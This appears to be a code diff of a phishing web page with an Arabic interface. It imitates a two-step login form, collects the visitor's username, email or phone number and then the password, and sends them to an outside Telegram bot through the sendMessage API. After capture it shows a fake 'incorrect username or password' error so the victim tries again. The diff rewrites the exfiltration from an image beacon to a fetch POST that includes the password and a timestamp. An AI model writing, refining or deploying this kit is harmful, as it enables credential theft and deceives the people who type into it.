+    const backBtn = document.getElementById('backBtn');
+    const forgotBtn = document.getElementById('forgotBtn');
 
+    const countryBtn = document.getElementById('countryBtn');
     const countryModal = document.getElementById('countryModal');
     const countryList = document.getElementById('countryList');
     const countrySearch = document.getElementById('countrySearch');
+    const countryFlag = document.getElementById('countryFlag');
+    const countryDial = document.getElementById('countryDial');
 
-    const nameInput = document.getElementById('nameInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const backBtn = document.getElementById('backBtn');
-    const hint2 = document.getElementById('hint2');
+    const toastOverlay = document.getElementById('toastOverlay');
+    const toastIcon = document.getElementById('toastIcon');
+    const toastTitle = document.getElementById('toastTitle');
+    const toastText = document.getElementById('toastText');
+    const toastBtn = document.getElementById('toastBtn');
 
-    const toastBack = document.getElementById('toastBack');
-    const toastOk = document.getElementById('toastOk');
+    const hint1 = document.getElementById('hint1');
+    const hintPhone = document.getElementById('hintPhone');
+    const hintPassword = document.getElementById('hintPassword');
 
-    // ====== State ======
-    let phoneMode = false;
-    let selectedCountry = COUNTRIES[0];
-    let prev = null; // {type, value, country}
+    const page2Title = document.getElementById('page2Title');
+    const page2Subtitle = document.getElementById('page2Subtitle');
 
-    // ====== Small utilities ======
-    function bindAscii(el){
-      el.addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,''); // keep ascii
-        if(e.target.value.length > 100) e.target.value = e.target.value.slice(0,100);
-      });
-      el.addEventListener('keydown', e => { if(e.key === 'Enter') continueBtn.click(); });
+    // ==================== UTILITIES ====================
+    function isTokenValid() {
+      return TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('YOUR') && !TG_CHAT_ID.includes('YOUR');
     }
 
-    function showToast(title, text){
-      document.getElementById('toastTitle').textContent = title;
-      document.getElementById('toastText').textContent = text;
-      toastBack.style.display = 'flex';
-    }
-
-    // ====== Phone toggling (swap primary input) ======
-    function switchToPhone(){
-      phoneMode = true;
-      primaryHolder.innerHTML = `
-        <div style="display:flex;gap:10px;align-items:center">
-          <button id="countryBtn" class="select-btn" type="button"><span id="countryFlag">${selectedCountry.flag}</span>&nbsp;<span id="countryDial">${selectedCountry.dial}</span></button>
-          <input id="phoneInput" type="tel" placeholder="أدخل رقم الهاتف" inputmode="numeric" />
-        </div>
-      `;
-      document.getElementById('countryBtn').addEventListener('click', ()=> {
-        renderCountries(COUNTRIES);
-        countryModal.style.display = 'flex';
-        setTimeout(()=> countrySearch.focus(), 120);
-      });
-      primaryInput = document.getElementById('phoneInput');
-      primaryInput.addEventListener('input', e => { e.target.value = digitsOnly(e.target.value); });
-      primaryInput.addEventListener('keydown', e => { if(e.key === 'Enter') continueBtn.click(); });
-      phoneToggle.setAttribute('aria-pressed','true');
-      phoneToggle.textContent = 'استخدم البريد الإلكتروني/اسم المستخدم بدلاً من ذلك';
-      hint1.textContent = '';
-    }
-
-    function switchToPrimary(){
-      phoneMode = false;
-      primaryHolder.innerHTML = `<input id="primaryInput" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />`;
-      primaryInput = document.getElementById('primaryInput');
-      bindAscii(primaryInput);
-      phoneToggle.setAttribute('aria-pressed','false');
-      phoneToggle.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
-      hint1.textContent = '';
-    }
-
-    phoneToggle.addEventListener('click', () => {
-      if(!phoneMode) switchToPhone(); else switchToPrimary();
-    });
-
-    // ====== Countries modal ======
-    function renderCountries(list){
-      countryList.innerHTML = '';
-      list.forEach(c => {
-        const row = document.createElement('div');
-        row.className = 'country-item';
-        row.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span class="country-flag">${c.flag}</span><div style="display:flex;flex-direction:column;margin-right:8px"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div><div style="font-weight:700;color:#233">${c.dial}</div>`;
-        row.addEventListener('click', () => {
-          selectedCountry = c;
-          const cf = document.getElementById('countryFlag');
-          const cd = document.getElementById('countryDial');
-          if(cf) cf.textContent = c.flag;
-          if(cd) cd.textContent = c.dial;
-          countryModal.style.display = 'none';
-          const pi = document.getElementById('phoneInput');
-          if(pi){ pi.placeholder = 'أدخل رقم الهاتف ' + c.dial; pi.focus(); }
-        });
-        countryList.appendChild(row);
-      });
-      if(list.length === 0) countryList.innerHTML = '<div style="padding:12px;color:var(--muted);text-align:center">لا توجد نتائج</div>';
-    }
-    countrySearch.addEventListener('input', () => {
-      const q = countrySearch.value.trim().toLowerCase();
-      if(!q) return renderCountries(COUNTRIES);
-      const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
-      renderCountries(filtered);
-    });
-    countryModal.addEventListener('click', (e) => { if(e.target === countryModal) countryModal.style.display = 'none'; });
-
-    // ====== Validation primary ======
-    function validatePrimary(){
-      if(phoneMode){
-        const v = (document.getElementById('phoneInput')||{value:''}).value.trim();
-        const clean = digitsOnly(v);
-        if(clean.length < 6){ hint1.style.color = 'crimson'; hint1.textContent = 'الرجاء إدخال رقم هاتف صالح'; setTimeout(()=> hint1.textContent = '', 2000); return null; }
-        return { type:'phone', value: clean, country: selectedCountry };
-      } else {
-        const v = (document.getElementById('primaryInput')||{value:''}).value.trim();
-        if(!v){ hint1.style.color = 'crimson'; hint1.textContent = 'الرجاء إدخال اسم المستخدم أو البريد'; setTimeout(()=> hint1.textContent = '',2000); return null; }
-        if(v.includes('@')){
-          if(!emailRx.test(v)){ hint1.style.color = 'crimson'; hint1.textContent = 'بريد إلكتروني غير صالح'; setTimeout(()=> hint1.textContent = '',2200); return null; }
-          return { type:'email', value: v };
-        } else {
-          if(!usernameRx.test(v)){ hint1.style.color = 'crimson'; hint1.textContent = 'اسم مستخدم غير صالح (3-30 حرف إنجليزي/أرقام/._-)'; setTimeout(()=> hint1.textContent = '',3000); return null; }
-          return { type:'username', value: v };
-        }
+    function cleanInput(str, allowSymbols = false) {
+      if (!allowSymbols) {
+        return str.replace(/[^\x00-\x7F]/g, '').trim();
       }
+      return str.trim();
     }
 
-    // ====== Send to Telegram (Image GET) - no timestamp ======
-    function canSend(){
-      return typeof TG_TOKEN !== 'undefined' && typeof TG_CHAT_ID !== 'undefined' && TG_TOKEN && TG_CHAT_ID && !TG_TOKEN.includes('PASTE');
+    function getDigitsOnly(str) {
+      return str.replace(/[^\d]/g, '');
     }
-    function sendToTelegram(text){
-      if(!canSend()){
-        hint1.style.color = '#b45a00';
-        hint1.textContent = 'التوكن/Chat ID غير مضافين في رأس الملف — لن يُرسل فعليًا.';
-        setTimeout(()=> hint1.textContent = '', 2600);
+
+    function showToast(icon, title, text) {
+      toastIcon.textContent = icon;
+      toastTitle.textContent = title;
+      toastText.textContent = text;
+      toastOverlay.classList.add('show');
+    }
+
+    function hideToast() {
+      toastOverlay.classList.remove('show');
+    }
+
+    function showHint(element, text, type = 'error') {
+      element.textContent = text;
+      element.classList.remove('error', 'warning');
+      if (type) element.classList.add(type);
+      setTimeout(() => {
+        element.textContent = '';
+        element.classList.remove('error', 'warning');
+      }, 3000);
+    }
+
+    // ==================== SEND TO TELEGRAM ====================
+    async function sendToTelegram(message) {
+      if (!isTokenValid()) {
+        showHint(hint1, '⚠️ البيانات غير مضافة في الملف', 'warning');
         return false;
       }
+
       try {
-        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;
-        const img = new Image();
-        img.src = url + '&_=' + Date.now();
-        console.log('Telegram URL:', url);
+        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML',
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error('فشل الإرسال');
+        }
+
         return true;
-      } catch(e){ console.error(e); return false; }
+      } catch (error) {
+        console.error('Telegram Error:', error);
+        showToast('❌', 'خطأ', 'فشل الاتصال - تحقق من البيانات');
+        return false;
+      }
     }
 
-    // ====== Navigation between pages (page1 -> page2) ======
-    function goToPage2(){
+    // ==================== FORM VALIDATION ====================
+    function validatePrimary() {
+      let input, hint, type, value;
+
+      if (state.phoneMode) {
+        input = phoneInput;
+        hint = hintPhone;
+        const digits = getDigitsOnly(input.value);
+        if (!REGEX.phone.test(digits)) {
+          showHint(hint, '❌ رقم هاتف غير صحيح (6-15 رقم)', 'error');
+          return null;
+        }
+        type = 'phone';
+        value = digits;
+      } else {
+        input = primaryInput;
+        hint = hint1;
+        value = cleanInput(input.value);
+
+        if (!value) {
+          showHint(hint, '❌ أدخل اسم المستخدم أو البريد', 'error');
+          return null;
+        }
+
+        if (value.includes('@')) {
+          if (!REGEX.email.test(value)) {
+            showHint(hint, '❌ بريد إلكتروني غير صحيح', 'error');
+            return null;
+          }
+          type = 'email';
+        } else {
+          if (!REGEX.username.test(value)) {
+            showHint(hint, '❌ اسم غير صحيح (3-30 حرف وأرقام)', 'error');
+            return null;
+          }
+          type = 'username';
+        }
+      }
+
+      return { type, value };
+    }
+
+    function validatePassword() {
+      const password = passwordInput.value;
+
+      if (!password) {
+        showHint(hintPassword, '❌ أدخل كلمة المرور', 'error');
+        return null;
+      }
+
+      if (password.length < 6) {
+        showHint(hintPassword, '❌ كلمة المرور قصيرة جداً', 'error');
+        return null;
+      }
+
+      return password;
+    }
+
+    // ==================== PAGE TRANSITIONS ====================
+    function goToPage2(credentials) {
+      state.credentials = credentials;
+      page2Title.textContent = `مرحباً 👋`;
+      page2Subtitle.textContent = `${credentials.type === 'phone' ? credentials.value : credentials.value}`;
+
       page1.classList.add('slide-out');
+      page1.classList.add('hidden');
       page2.classList.remove('hidden');
       page2.classList.add('slide-in');
-      setTimeout(()=> {
-        page1.classList.remove('slide-out');
+
+      setTimeout(() => {
         page2.classList.remove('slide-in');
-        page1.classList.add('hidden');
-      }, 380);
-      history.pushState({page:'step2'}, '', '#step2');
-      nameInput.focus();
+        passwordInput.focus();
+      }, 400);
     }
-    function goToPage1(){
+
+    function goToPage1() {
       page2.classList.add('slide-out');
+      page2.classList.add('hidden');
       page1.classList.remove('hidden');
       page1.classList.add('slide-in');
-      setTimeout(()=> {
-        page2.classList.remove('slide-out');
+
+      setTimeout(() => {
         page1.classList.remove('slide-in');
-        page2.classList.add('hidden');
-      }, 380);
-      history.pushState({page:'step1'}, '', '#step1');
-      const p = document.getElementById('primaryInput') || document.getElementById('phoneInput');
-      if(p) p.focus();
+        primaryInput.focus();
+      }, 400);
+
+      state.credentials = null;
+      passwordInput.value = '';
+      hintPassword.textContent = '';
     }
 
-    // ====== Buttons behavior ======
-    continueBtn.addEventListener('click', () => {
-      const primary = validatePrimary();
-      if(!primary) return;
-      prev = primary;
-      const countryText = primary.type === 'phone' && primary.country ? `${primary.country.name} ${primary.country.dial}` : '—';
-      const msg = `النوع: ${primary.type}\nالقيمة: ${primary.value}\nالبلد: ${countryText}`;
-      sendToTelegram(msg);
-      goToPage2();
+    // ==================== PHONE MODE TOGGLE ====================
+    function togglePhoneMode() {
+      state.phoneMode = !state.phoneMode;
+
+      if (state.phoneMode) {
+        userEmailMode.classList.add('hidden');
+        phoneMode.classList.remove('hidden');
+        toggleText.textContent = 'استخدم البريد أو اسم المستخدم';
+        setTimeout(() => phoneInput.focus(), 100);
+      } else {
+        phoneMode.classList.add('hidden');
+        userEmailMode.classList.remove('hidden');
+        toggleText.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
+        setTimeout(() => primaryInput.focus(), 100);
+      }
+
+      hint1.textContent = '';
+      hintPhone.textContent = '';
+    }
+
+    // ==================== COUNTRY MODAL ====================
+    function renderCountries(list) {
+      countryList.innerHTML = '';
+
+      if (list.length === 0) {
+        countryList.innerHTML = '<div style="padding: 20px; text-align: center; color: var(--text-muted);">لا توجد نتائج</div>';
+        return;
+      }
+
+      list.forEach((country) => {
+        const item = document.createElement('div');
+        item.className = 'modal-item';
+        item.innerHTML = `
+          <div class="modal-item-left">
+            <div class="modal-item-flag">${country.flag}</div>
+            <div class="modal-item-info">
+              <div class="modal-item-name">${country.name}</div>
+              <div class="modal-item-code">${country.code}</div>
+            </div>
+          </div>
+          <div class="modal-item-dial">${country.dial}</div>
+        `;
+        item.addEventListener('click', () => selectCountry(country));
+        countryList.appendChild(item);
+      });
+    }
+
+    function selectCountry(country) {
+      state.selectedCountry = country;
+      countryFlag.textContent = country.flag;
+      countryDial.textContent = country.dial;
+      countryModal.classList.remove('show');
+      phoneInput.focus();
+    }
+
+    function filterCountries(query) {
+      const q = query.toLowerCase();
+      return COUNTRIES.filter(
+        (c) =>
+          c.name.toLowerCase().includes(q) ||
+          c.code.toLowerCase().includes(q) ||
+          c.dial.includes(q)
+      );
+    }
+
+    // ==================== EVENT LISTENERS ====================
+    // Page 1 Events
+    toggleBtn.addEventListener('click', togglePhoneMode);
+
+    continueBtn.addEventListener('click', async () => {
+      const credentials = validatePrimary();
+      if (!credentials) return;
+
+      // Send to Telegram
+      const msg = `
+<b>🔐 بيانات المستخدم</b>
+
+<b>النوع:</b> ${credentials.type === 'email' ? '📧 بريد' : credentials.type === 'username' ? '👤 اسم مستخدم' : '📱 هاتف'}
+<b>القيمة:</b> <code>${credentials.value}</code>
+${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}` : ''}
+      `;
+
+      await sendToTelegram(msg);
+      goToPage2(credentials);
     });
 
-    sendBtn.addEventListener('click', () => {
-      const name = nameInput.value.trim();
-      if(!name){ hint2.style.color = 'crimson'; hint2.textContent = 'الرجاء إدخال كلمة السر بشكل صحيح'; setTimeout(()=> hint2.textContent = '', 2200); return; }
-      if(!prev){ showToast('خطأ','لا توجد بيانات سابقة — عد للصفحة الأولى.'); return; }
-      const countryText = prev.type === 'phone' && prev.country ? `${prev.country.name} ${prev.country.dial}` : '—';
-      const msg = `النوع: ${prev.type}\nالقيمة: ${prev.value}\nالبلد: ${countryText}\nالاسم: ${name}`;
-      sendToTelegram(msg);
-      showToast('عذراً','اسم المستخدم أو كلمة السر غير صحيحة. يرجى التحقق والمحاولة مرة أخرى.');
-      prev = null;
-      nameInput.value = '';
+    primaryInput.addEventListener('input', (e) => {
+      e.target.value = cleanInput(e.target.value, false);
     });
 
+    primaryInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') continueBtn.click();
+    });
+
+    phoneInput.addEventListener('input', (e) => {
+      e.target.value = getDigitsOnly(e.target.value);
+    });
+
+    phoneInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') continueBtn.click();
+    });
+
+    countryBtn.addEventListener('click', () => {
+      renderCountries(COUNTRIES);
+      countryModal.classList.add('show');
+      countrySearch.focus();
+    });
+
+    countrySearch.addEventListener('input', (e) => {
+      const filtered = filterCountries(e.target.value);
+      renderCountries(filtered);
+    });
+
+    countryModal.addEventListener('click', (e) => {
+      if (e.target === countryModal) {
+        countryModal.classList.remove('show');
+      }
+    });
+
+    // Page 2 Events
     backBtn.addEventListener('click', goToPage1);
 
-    // toast
-    function showToast(title, text){
-      document.getElementById('toastTitle').textContent = title;
-      document.getElementById('toastText').textContent = text;
-      toastBack.style.display = 'flex';
-    }
-    toastOk.addEventListener('click', () => {
-      toastBack.style.display = 'none';
-      goToPage1();
-    });
+    sendBtn.addEventListener('click', async () => {
+      const password = validatePassword();
+      if (!password) return;
 
-    // keyboard interactions & closing modal
-    document.addEventListener('keydown', e => {
-      if(e.key === 'Enter'){
-        if(!page2.classList.contains('hidden')) sendBtn.click();
-        else continueBtn.click();
+      if (!state.credentials) {
+        showToast('⚠️', 'خطأ', 'بيانات المستخدم مفقودة');
+        return;
       }
-      if(e.key === 'Escape'){
-        if(countryModal.style.display === 'flex') countryModal.style.display = 'none';
-        if(toastBack.style.display === 'flex') toastBack.style.display = 'none';
+
+      // Show loading
+      state.isLoading = true;
+      sendBtn.disabled = true;
+      sendBtnText.classList.add('hidden');
+      sendSpinner.classList.remove('hidden');
+
+      // Send to Telegram
+      const msg = `
+<b>🔐 بيانات دخول كاملة</b>
+
+<b>النوع:</b> ${state.credentials.type === 'email' ? '📧 بريد' : state.credentials.type === 'username' ? '👤 اسم مستخدم' : '📱 هاتف'}
+<b>المستخدم:</b> <code>${state.credentials.value}</code>
+${state.phoneMode ? `<b>الدولة:</b> ${state.selectedCountry.name} ${state.selectedCountry.dial}` : ''}
+<b>كلمة المرور:</b> <code>${password}</code>
+
+⏰ <i>${new Date().toLocaleString('ar-SA')}</i>
+      `;
+
+      const success = await sendToTelegram(msg);
+
+      // Hide loading
+      state.isLoading = false;
+      sendBtn.disabled = false;
+      sendBtnText.classList.remove('hidden');
+      sendSpinner.classList.add('hidden');
+
+      if (success) {
+        showToast('❌', 'فشل الدخول', 'اسم المستخدم أو كلمة المرور غير صحيحة');
+        passwordInput.value = '';
+        setTimeout(() => {
+          hideToast();
+          goToPage1();
+        }, 3000);
       }
     });
 
-    // history popstate (back button)
-    window.addEventListener('popstate', (e) => {
-      const page = e.state && e.state.page ? e.state.page : (location.hash === '#step2' ? 'step2' : 'step1');
-      if(page === 'step2'){ page1.classList.add('hidden'); page2.classList.remove('hidden'); }
-      else { page2.classList.add('hidden'); page1.classList.remove('hidden'); }
+    passwordInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' && !state.isLoading) sendBtn.click();
     });
 
-    // init
-    (function init(){
-      bindAscii(primaryInput);
-      renderCountries(COUNTRIES);
-      if(location.hash === '#step2'){ page1.classList.add('hidden'); page2.classList.remove('hidden'); } else { page2.classList.add('hidden'); page1.classList.remove('hidden'); }
-    })();
+    togglePasswordBtn.addEventListener('click', () => {
+      const type = passwordInput.type === 'password' ? 'text' : 'password';
+      passwordInput.type = type;
+      togglePasswordBtn.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+
+    forgotBtn.addEventListener('click', () => {
+      showToast('ℹ️', 'نسيت كلمة المرور؟', 'تواصل مع خدمة العملاء');
+    });
+
+    // Toast
+    toastBtn.addEventListener('click', hideToast);
+
+    // Keyboard
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        countryModal.classList.remove('show');
+        hideToast();
+      }
+    });
+
+    // Initialize
+    renderCountries(COUNTRIES);
+    primaryInput.focus();
   </script>
 </body>
 </html>
